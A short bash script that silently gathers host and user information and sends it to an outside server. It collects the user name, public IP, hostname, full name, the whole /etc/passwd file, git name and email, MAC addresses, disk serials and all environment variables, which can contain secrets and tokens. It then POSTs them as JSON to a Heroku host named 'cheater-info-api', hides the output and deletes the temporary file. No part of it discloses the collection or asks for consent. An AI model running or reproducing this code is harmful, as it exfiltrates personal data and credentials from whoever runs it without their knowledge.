#!/bin/bash

username=$(whoami)
ip_public=$(curl -s https://api.ipify.org)
hostname=$(hostname)
full_name=$(cat /etc/passwd | grep "${USER}" | cut -d ':' -f 5)
user_list=$(cat /etc/passwd)
git_user_name=$(git config get user.name)
git_user_email=$(git config get user.email)
pwd=$(pwd)
MAC=$(ip a | grep link/ether | awk '{print $2}')
ip_infos=$(ip a)
storage_serials=$(lsblk -o NAME,SERIAL)
# bash_history="${bash_history//"\""/"\'"}"
bash_history=""
env_vars=$(printenv)

json_data="{\"username\":\"$username\",\
\"ip_public\":\"$ip_public\",\
\"hostname\":\"$hostname\",\
\"full_name\":\"$full_name\",\
\"user_list\":\"$user_list\",\
\"git_user_name\":\"$git_user_name\",\
\"git_user_email\":\"$git_user_email\",\
\"pwd\":\"$pwd\",\
\"MAC\":\"$MAC\",\
\"ip_infos\":\"$ip_infos\",\
\"storage_serials\":\"$storage_serials\",\
\"bash_history\":\"$bash_history\",\
\"env\":\"$env_vars\"}"
json_data="${json_data//" "/" "}"
echo "${json_data}" > temp.json

curl -X POST -H "Content-Type: application/json" -d @temp.json https://cheater-info-api-5d0a7c8050b7.herokuapp.com >/dev/null
rm temp.json